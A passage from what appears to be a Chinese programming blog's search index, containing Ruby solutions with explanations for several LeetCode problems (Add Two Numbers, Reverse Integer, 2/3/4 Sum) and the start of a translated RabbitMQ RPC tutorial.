<span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  i = min_size - <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> i &gt;= <span class="number">0</span></span><br><span class="line">    prefix = strs[min_index][<span class="number">0</span>..i]</span><br><span class="line">    found = <span class="literal">true</span></span><br><span class="line">    strs.each_with_index <span class="keyword">do</span> <span class="params">|str, index|</span></span><br><span class="line">      <span class="keyword">next</span> <span class="keyword">if</span> index == min_index</span><br><span class="line">      <span class="keyword">if</span> prefix != str[<span class="number">0</span>..i]</span><br><span class="line">        found = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> prefix <span class="keyword">if</span> found</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-2"><a href="#复杂度-2" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(m * n)</code>，m是最短子串的长度，n是数组长度。</li><li>空间复杂度：<code>O(m)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Add Two Numbers</title>
      <link href="/2018/02/23/Add-Two-Numbers/"/>
      <url>/2018/02/23/Add-Two-Numbers/</url>
      <content type="html"><![CDATA[<h1 id="Add-Two-Numbers"><a href="#Add-Two-Numbers" class="headerlink" title="Add Two Numbers"></a>Add Two Numbers</h1><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>这个比较简单，同时遍历两个链表，还有一个进位，把两个链表和进位同时相加，将结果对10取余，并更新进位。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; l1</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; l2</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_two_numbers</span><span class="params">(l1, l2)</span></span></span><br><span class="line">  l3 = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  c1 = l1</span><br><span class="line">  c2 = l2</span><br><span class="line">  c3 = l3</span><br><span class="line">  carry = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> c1 <span class="keyword">or</span> c2</span><br><span class="line">    x = c1.<span class="literal">nil</span>? ? <span class="number">0</span> : c1.val</span><br><span class="line">    y = c2.<span class="literal">nil</span>? ? <span class="number">0</span> : c2.val</span><br><span class="line">    sum = x + y + carry</span><br><span class="line">    carry = sum / <span class="number">10</span></span><br><span class="line">    c3.<span class="keyword">next</span> = ListNode.new(sum % <span class="number">10</span>)</span><br><span class="line">    c1 = c1.<span class="literal">nil</span>? ? <span class="literal">nil</span> : c1.<span class="keyword">next</span></span><br><span class="line">    c2 = c2.<span class="literal">nil</span>? ? <span class="literal">nil</span> : c2.<span class="keyword">next</span></span><br><span class="line">    c3 = c3.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> (carry &gt; <span class="number">0</span>)</span><br><span class="line">    c3.<span class="keyword">next</span> = ListNode.new(carry)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  l3.<span class="keyword">next</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Reverse Integer</title>
      <link href="/2018/02/23/Reverse-Integer/"/>
      <url>/2018/02/23/Reverse-Integer/</url>
      <content type="html"><![CDATA[<h1 id="7-Reverse-Integer"><a href="#7-Reverse-Integer" class="headerlink" title="7. Reverse Integer"></a>7. Reverse Integer</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a 32-bit signed integer, reverse digits of an integer.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 123</span><br><span class="line">Output: 321</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -123</span><br><span class="line">Output: -321</span><br></pre></td></tr></table></figure></p><p>Example 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 120</span><br><span class="line">Output: 21</span><br></pre></td></tr></table></figure></p><p><strong>Note:</strong><br>Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [−2^31,  2^31 − 1]. For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows.</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>这个好办，就是求所给数除以10的商和余数，将先前的余数乘以10加上余数；得到的商作为下一轮的被除数。<br>一直循环，直到被除数为0。</p><blockquote><p>需要判断溢出的情况</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(x)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> x == <span class="number">0</span></span><br><span class="line">  s = x / x.abs</span><br><span class="line">  x = x.abs</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> x &gt; <span class="number">0</span></span><br><span class="line">    x, mod = x.divmod(<span class="number">10</span>)</span><br><span class="line">    result = result * <span class="number">10</span> + mod</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  result *= s</span><br><span class="line">  (result &gt; <span class="number">2147483647</span> <span class="keyword">or</span> result &lt; -<span class="number">2147483648</span>) ? <span class="number">0</span> : result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(log10n)</code>，n为输入的整数。</li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2 3 4 Sum</title>
      <link href="/2018/02/22/2-3-4-Sum/"/>
      <url>/2018/02/22/2-3-4-Sum/</url>
      <content type="html"><![CDATA[<h1 id="2-3-4-Sum"><a href="#2-3-4-Sum" class="headerlink" title="2 3 4 Sum"></a>2 3 4 Sum</h1><h2 id="1-Two-Sum"><a href="#1-Two-Sum" class="headerlink" title="1. Two Sum"></a>1. Two Sum</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given an array of integers, return indices of the two numbers such that they add up to a specific target.</p><p>You may assume that each input would have exactly one solution, and you may not use the same element twice.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [2, 7, 11, 15], target = 9,</span><br><span class="line"></span><br><span class="line">Because nums[0] + nums[1] = 2 + 7 = 9,</span><br><span class="line">return [0, 1].</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>主要思路是用哈希存储元素和索引，key是元素，value是索引。</p><p>遍历数组，用<code>target</code>减去当前元素，得到的差去哈希里找，有对应的值就和当前索引一起返回即可。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; target</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">two_sum</span><span class="params">(nums, target)</span></span></span><br><span class="line">  h = Hash.new</span><br><span class="line">  nums.each_with_index <span class="keyword">do</span> <span class="params">|num, index|</span></span><br><span class="line">    left = target - num</span><br><span class="line">    <span class="keyword">if</span> h[left] </span><br><span class="line">      <span class="keyword">return</span> [h[left], index]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    h[num] = index</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="15-3Sum"><a href="#15-3Sum" class="headerlink" title="15. 3Sum"></a>15. 3Sum</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given an array nums of n integers, are there elements a, b, c in nums such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.</p><p>Note:</p><p>The solution set must not contain duplicate triplets.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Given array nums = [-1, 0, 1, 2, -1, -4],</span><br><span class="line"></span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [-1, 0, 1],</span><br><span class="line">  [-1, -1, 2]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>先把数组排序，这样在遍历数组的时候，如果遇到大于0的数直接结束即可，排序算法最快的是<code>O(nlogn)</code>。</p><p>遍历到当前元素后，取两个指针，分别代表它后面的首尾元素：</p><ul><li>如果和为0，第一个指针后移，第二个前移，直接跳过重复元素</li><li>如果和小于0，第一个指针后移</li><li>如果和大于0，第二个指针前移</li></ul><p>这样直到两个指针相遇。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">three_sum</span><span class="params">(nums)</span></span></span><br><span class="line">  nums.sort!</span><br><span class="line">  set = Array.new</span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; nums.length - <span class="number">2</span></span><br><span class="line">    <span class="keyword">break</span> <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i - <span class="number">1</span>]</span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">      <span class="keyword">next</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    j = i + <span class="number">1</span></span><br><span class="line">    k = nums.length - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; k</span><br><span class="line">      <span class="keyword">if</span> nums[i] + nums[j] + nums[k] == <span class="number">0</span></span><br><span class="line">        triplet = [nums[i], nums[j], nums[k]]</span><br><span class="line">        set.push triplet</span><br><span class="line">        j += <span class="number">1</span> <span class="keyword">while</span> nums[j] == nums[j + <span class="number">1</span>]</span><br><span class="line">        k -= <span class="number">1</span> <span class="keyword">while</span> nums[k] == nums[k - <span class="number">1</span>]</span><br><span class="line">        j, k = j + <span class="number">1</span>, k - <span class="number">1</span></span><br><span class="line">      <span class="keyword">elsif</span> nums[i] + nums[j] + nums[k] &lt; <span class="number">0</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        k -= <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> set</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n^2)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="16-3Sum-Closest"><a href="#16-3Sum-Closest" class="headerlink" title="16. 3Sum Closest"></a>16. 3Sum Closest</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>Given an array nums of n integers and an integer target, find three integers in nums such that the sum is closest to target. Return the sum of the three integers. You may assume that each input would have exactly one solution.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given array nums = [-1, 2, 1, -4], and target = 1.</span><br><span class="line"></span><br><span class="line">The sum that is closest to the target is 2. (-1 + 2 + 1 = 2).</span><br></pre></td></tr></table></figure></p><h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p>这题同样是先排序，然后从头到尾遍历，取当前元素首尾指针：</p><ul><li>如果三个数的和与目标值相同，直接返回目标值；</li><li>比目标值小，首指针后移；</li><li>比目标值大，尾指针前移；</li></ul><p>在整个过程中记录最小距离，最后用目标值减去最小距离即可。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; target</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">three_sum_closest</span><span class="params">(nums, target)</span></span></span><br><span class="line">  nums.sort!</span><br><span class="line">  min_diff = <span class="string">"#"</span></span><br><span class="line">  nums.each_with_index <span class="keyword">do</span> <span class="params">|i, index|</span></span><br><span class="line">    j, k = index + <span class="number">1</span>, nums.length - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; k</span><br><span class="line">      diff = target - nums[j] - nums[k] - i</span><br><span class="line">      <span class="keyword">return</span> target <span class="keyword">if</span> diff == <span class="number">0</span></span><br><span class="line">      min_diff = diff <span class="keyword">if</span> min_diff == <span class="string">"#"</span> <span class="keyword">or</span> diff.abs &lt; min_diff.abs</span><br><span class="line">      <span class="keyword">if</span> diff &gt; <span class="number">0</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        k -= <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  target - min_diff</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-2"><a href="#复杂度-2" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n^2)</code></li><li>空间复杂度：<code>O(1)</code></li></ul><h2 id="18-4Sum"><a href="#18-4Sum" class="headerlink" title="18. 4Sum"></a>18. 4Sum</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><p>Given an array nums of n integers and an integer target, are there elements a, b, c, and d in nums such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target.</p><p>Note:</p><p>The solution set must not contain duplicate quadruplets.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Given array nums = [1, 0, -1, 0, -2, 2], and target = 0.</span><br><span class="line"></span><br><span class="line">A solution set is:</span><br><span class="line">[</span><br><span class="line">  [-1,  0, 0, 1],</span><br><span class="line">  [-2, -1, 1, 2],</span><br><span class="line">  [-2,  0, 0, 2]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-3"><a href="#算法-3" class="headerlink" title="算法"></a>算法</h3><p>这题主要思路是把<code>Four Sum</code>问题转化成<code>Two Sum</code>问题：</p><ul><li>先把数组的数两两配对，以它们的和为key，配对为value，存到hash中；</li><li>两两取数，用<code>target</code>减去这两个数的和，用差值去上一步的hash中去找；</li><li>如果找到了，那就和当前两个数组和成结果，这里需要去重。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; target</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">four_sum</span><span class="params">(nums, target)</span></span></span><br><span class="line">  nums.sort!</span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  table = Hash.new</span><br><span class="line">  result = Array.new</span><br><span class="line">  <span class="keyword">while</span> i &lt; nums.length - <span class="number">1</span></span><br><span class="line">    j = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; nums.length</span><br><span class="line">      sum = nums[i] + nums[j]</span><br><span class="line">      <span class="keyword">if</span> table.has_key?(sum)</span><br><span class="line">        table[sum].push([i, j])</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        table[sum] = [[i, j]]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; nums.length - <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i - <span class="number">1</span>]</span><br><span class="line">      i += <span class="number">1</span></span><br><span class="line">      <span class="keyword">next</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    j = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; nums.length - <span class="number">2</span></span><br><span class="line">      <span class="keyword">if</span> j &gt; i + <span class="number">1</span> <span class="keyword">and</span> nums[j] == nums[j - <span class="number">1</span>]</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">next</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      other = target - nums[i] - nums[j]</span><br><span class="line">      <span class="keyword">if</span> table.has_key?(other)</span><br><span class="line">        pairs = table[other]</span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> k &lt; pairs.length</span><br><span class="line">          <span class="keyword">if</span> pairs[k][<span class="number">0</span>] &gt; j</span><br><span class="line">            p = [nums[i], nums[j], nums[pairs[k][<span class="number">0</span>]], nums[pairs[k][<span class="number">1</span>]]]</span><br><span class="line">            result.push(p) <span class="keyword">if</span> <span class="keyword">not</span> result.<span class="keyword">include</span>?(p)</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          k += <span class="number">1</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result </span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-3"><a href="#复杂度-3" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n^4)</code>，最坏的情况是hash只有一组值，每次需要把这组值都遍历一遍。</li><li>空间复杂度：<code>O(n^2)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RabbitMQ教程（六）──远程过程调用</title>
      <link href="/2017/10/06/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E5%85%AD%EF%BC%89%E2%94%80%E2%94%80%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8/"/>
      <url>/2017/10/06/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E5%85%AD%EF%BC%89%E2%94%80%E2%94%80%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="远程过程调用"><a href="#远程过程调用" class="headerlink" title="远程过程调用"></a>远程过程调用</h1><p>（使用Ruby客户端）</p><p>在第二篇教程中我们介绍了如何使用工作队列（work queue）在多个工作者（woker）中间分发耗时的任务。</p><p>可是如果我们需要将一个函数运行在远程计算机上并且等待从那儿获取结果时，该怎么办呢？这就是另外的故事了。这种模式通常被称为远程过程调用（Remote Procedure Call）或者RPC。</p><p>这篇教程中，我们会使用RabbitMQ来构建一个RPC系统：包含一个客户端和一个RPC服务器。现在的情况是，我们没有一个值得被分发的足够耗时的任务，所以接下来，我们会创建一个模拟RPC服务来返回斐波那契数列。</p><a id="more"></a><h2 id="客户端接口"><a href="#客户端接口" class="headerlink" title="客户端接口"></a>客户端接口</h2><p>为了展示RPC服务如何使用，我们创建了一个简单的客户端类。它会暴露出一个名为<code>call</code>的方法用来发送一个RPC请求，并且在收到回应前保持阻塞。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">client = FibonacciClient.new(<span class="string">'rpc_queue'</span>)</span><br><span class="line"></span><br><span class="line">puts <span class="string">' [x] Requesting fib(30)'</span></span><br><span class="line">response = client.call(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">puts <span class="string">" [.] Got <span class="subst">#&#123;response&#125;</span>"</span></span><br></pre></td></tr></table></figure><blockquote><p>关于RPC的注意事项：</p></blockquote><blockquote><p>尽管RPC在计算领域是一个常用模式，但它也经常被诟病。当一个问题被抛出的时候，程序员往往意识不到这到底是由本地调用还是由较慢的RPC调用引起的。同样的困惑还来自于系统的不可预测性和给调试工作带来的不必要的复杂性。跟软件精简不同的是，滥用RPC会导致不可维护的面条代码.</p></blockquote><blockquote><p>考虑到这一点，牢记以下建议：</p></blockquote><blockquote><ul><li>确保能够明确的搞清楚哪个函数是本地调用的，哪个函数是远程调用的。</li><li>给你的系统编写文档。保持各个组件间的依赖明确。</li><li>处理错误案例。明了客户端改如何处理RPC服务器的宕机和长时间无响应情况。</li></ul></blockquote><blockquote><p>当对避免使用RPC有疑问的时候。如果可以的话，你应该尽量使用异步管道来代替RPC类的阻塞。结果被异步地推送到下一个计算场景。</p></blockquote><h2 id="回调队列"><a href="#回调队列" class="headerlink" title="回调队列"></a>回调队列</h2><p>一般来说通过RabbitMQ来实现RPC是很容易的。一个客户端发送请求信息，服务器端将其应用到一个回复信息中。为了接收到回复信息，客户端需要在发送请求的时候同时发送一个回调队列（callback queue）的地址。我们试试看：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">queue = channel.queue(<span class="string">''</span>, <span class="symbol">exclusive:</span> <span class="literal">true</span>)</span><br><span class="line">exchange = channel.default_exchange</span><br><span class="line"></span><br><span class="line">exchange.publish(message, <span class="symbol">routing_key:</span> <span class="string">'rpc_queue'</span>, <span class="symbol">reply_to:</span> queue.name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ... then code to read a response message from the callback_queue ...</span></span><br></pre></td></tr></table></figure><blockquote><p>消息属性</p></blockquote><blockquote><p>AMQP 0.9.1协议给消息预定义了一系列的14个属性。大多数属性很少会用到，除了以下几个：</p></blockquote><blockquote><ul><li><code>:persistent</code>：将消息标记为持久的（值为true）或暂存的（值为false）。第二篇教程里接触过这个属性，记得吧？</li><li><code>:content_type</code>：用来描述编码的mime-type。例如在实际使用中常常使用<code>application/json</code>来描述JOSN编码类型。</li><li><code>:reply_to</code>：通常用来命名回调队列。</li><li><code>:correlation_id</code>：用来将RPC的响应和请求关联起来。</li></ul></blockquote><h2 id="关联标识"><a href="#关联标识" class="headerlink" title="关联标识"></a>关联标识</h2><p>上边介绍的方法中，我们建议给每一个RPC请求新建一个回调队列。这不是一个高效的做法，幸好这儿有一个更好的办法 —— 